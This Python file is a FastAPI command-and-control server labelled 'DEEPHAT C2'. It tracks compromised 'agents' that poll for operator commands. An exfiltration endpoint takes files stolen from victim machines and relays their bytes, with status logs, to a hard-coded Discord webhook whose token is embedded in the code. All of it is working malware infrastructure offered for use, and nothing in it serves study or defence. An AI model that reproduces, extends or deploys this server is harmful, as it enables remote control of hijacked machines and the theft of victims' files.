import os
import time
import uuid
import datetime
import requests
import threading
import io
from typing import Optional

from fastapi import FastAPI, HTTPException, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn

app = FastAPI()

# --- 1. CONFIGURATION ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1550899791062376488/1-GKmou21K3q1Om5xs3600j6asR8DOIcQ74KhUoeMg4drOEQ5MusQJympoT7TmhSUVJ8"

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], 
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- 2. DATA STORAGE ---
agents = {} 
tasks = {}  

# --- 3. MODELS ---
class CommandRequest(BaseModel):
    agent_id: str
    command: str
    payload: Optional[str] = None

# --- 4. DISCORD LOGGING UTILITY ---

def discord_log(message: str, level: str = "INFO", file_bytes: bytes = None, filename: str = "file"):
    def _send():
        emoji = "🔵"
        if level == "ERROR": emoji = "🔴"
        elif level == "SUCCESS": emoji = "✅"
        elif level == "WARN": emoji = "🟡"
        elif level == "CRITICAL": emoji = "💀"
        
        # We use a simple text format for the message
        content_text = f"{emoji} **C2 Admin Log**\n{message}"
        
        try:
            if file_bytes:
                # This is the magic part for sending the actual image
                byte_stream = io.BytesIO(file_bytes)
                files = {"file": (filename, byte_stream, "application/octet-stream")}
                
                # We send the text as 'payload_json' so Discord knows it's an embed/text
                payload = {"content": content_text}
                
                requests.post(
                    DISCORD_WEBHOOK_URL, 
                    data=payload, 
                    files=files, 
                    timeout=15
                )
            else:
                # Standard text-only log
                requests.post(DISCORD_WEBHOOK_URL, json={"content": content_text}, timeout=5)
        except Exception as e:
            print(f"[!] Discord Log Error: {e}")

    threading.Thread(target=_send, daemon=True).start()

# --- 5. AGENT ENDPOINTS ---

@app.get("/agent/{agent_id}/poll")
async def poll_task(agent_id: str):
    if agent_id not in agents:
        agents[agent_id] = {"status": "online", "first_seen": time.time()}
        discord_log(f"New Agent Connection: {agent_id}", "SUCCESS")
    
    agents[agent_id]["last_seen"] = time.time()
    agents[agent_id]["status"] = "online"
    
    if agent_id in tasks and len(tasks[agent_id]) > 0:
        return tasks[agent_id].pop(0)
    
    return {"task": "IDLE", "task_id": None, "payload": None}

@app.post("/agent/{agent_id}/exfiltrate")
async def exfiltrate(agent_id: str, file: UploadFile = File(...)):
    """The Agent MUST send a file here, not just a string."""
    try:
        # 1. Read the actual file bytes from the agent
        content = await file.read()
        fname = file.filename

        if not content:
            return {"status": "error", "message": "Empty file received"}

        # 2. Log to Discord with the actual file bytes
        discord_log(
            message=f"**[EXFILTRATION]**\nAgent: `{agent_id}`\nFile: `{fname}`",
            level="SUCCESS",
            file_bytes=content,
            filename=fname
        )
        
        return {"status": "success"}
    except Exception as e:
        print(f"Exfiltrate Error: {str(e)}")
        return {"status": "error", "message": str(e)}

# --- 6. DASHBOARD ENDPOINTS ---

@app.get("/dashboard/agents")
async def list_agents():
    return agents

@app.post("/dashboard/command")
async def add_command(req: CommandRequest):
    if req.agent_id not in agents:
        agents[req.agent_id] = {"first_seen": time.time(), "status": "online"}

    new_task_id = str(uuid.uuid4())[:8] 
    new_task = {
        "task": req.command,
        "task_id": new_task_id,
        "payload": req.payload,
        "timestamp": datetime.datetime.now().strftime("%H:%M:%S")
    }

    if req.agent_id not in tasks:
        tasks[req.agent_id] = []
    
    tasks[req.agent_id].append(new_task)
    discord_log(f"Command Issued: **{req.command}** to **{req.agent_id}**", "INFO")
    return {"status": "success", "task_id": new_task_id}

@app.delete("/dashboard/agent/{agent_id}")
async def remove_agent(agent_id: str):
    if agent_id in agents:
        del agents[agent_id]
        if agent_id in tasks: del tasks[agent_id]
        discord_log(f"Agent {agent_id} removed.", "CRITICAL")
        return {"status": "removed"}
    raise HTTPException(status_code=404, detail="Agent not found")

@app.delete("/dashboard/clear_all")
async def clear_all_agents():
    global agents, tasks
    agents.clear()
    tasks.clear()
    discord_log("ALL agents cleared.", "CRITICAL")
    return {"status": "success"}

# --- 7. MAIN ---

if __name__ == "__main__":
    print("--- DEEPHAT C2 [STABLE RAM-MODE] ---")
    uvicorn.run(app, host="0.0.0.0", port=8000)